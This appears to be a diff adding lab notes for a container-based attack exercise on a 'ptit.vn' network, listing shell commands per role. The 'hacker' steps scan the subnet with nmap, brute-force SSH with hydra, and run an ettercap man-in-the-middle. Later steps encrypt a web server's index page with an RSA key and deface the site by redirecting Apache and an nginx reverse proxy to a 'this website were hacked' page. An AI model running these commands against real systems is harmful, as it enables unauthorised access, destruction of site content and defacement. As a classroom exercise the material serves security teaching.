@@ -1,0 +1,53 @@
+All container:
+echo "172.20.0.20 proxy.ptit.vn" >> /etc/hosts
+echo "172.20.0.25 web.ptit.vn" >> /etc/hosts
+
+
+hacker:
+nmap 172.20.0.0/24
+sudo hydra -L /home/ubuntu/users.txt -P /home/ubuntu/passwords.txt 172.20.0.25 ssh
+sudo ettercap -G (sysctl -w net.ipv4.ip_forward=1)
+openssl genrsa -out keypair.pem 2048
+openssl rsa -in keypair.pem -pubout > public.pem
+scp /home/ubuntu/public.pem ubuntu@172.20.0.25:/home/ubuntu/
+
+
+webserver:
+sudo -i
+cd /var/www/default/
+openssl rsautl -encrypt -inkey /home/ubuntu/public.pem -pubin -in index.html -out index_secret.enc
+cat index_secret.enc > index.html
+
+
+hacker: 
+scp ubuntu@172.20.0.25:/var/www/default/index.html /home/ubuntu
+openssl rsautl -decrypt -inkey keypair.pem -in index.html | tee index.dec
+
+
+
+webserver:
+mkdir -p /var/www/hacked
+sudo -i
+echo "this website were hacked" > /var/www/hacked/index.html
+vi /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:8080>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/hacked
+</VirtualHost>
+
+vi /etc/apache2/ports.conf
+Listen 8080
+
+
+hacker:
+curl web.ptit.vn:8080
+
+
+
+proxy:
+/etc/nginx/sites-available/nginx_rever.conf
+proxy_pass http://web.ptit.vn:8080/;
+
+nginx -s reload
+curl proxy.ptit.vn
+
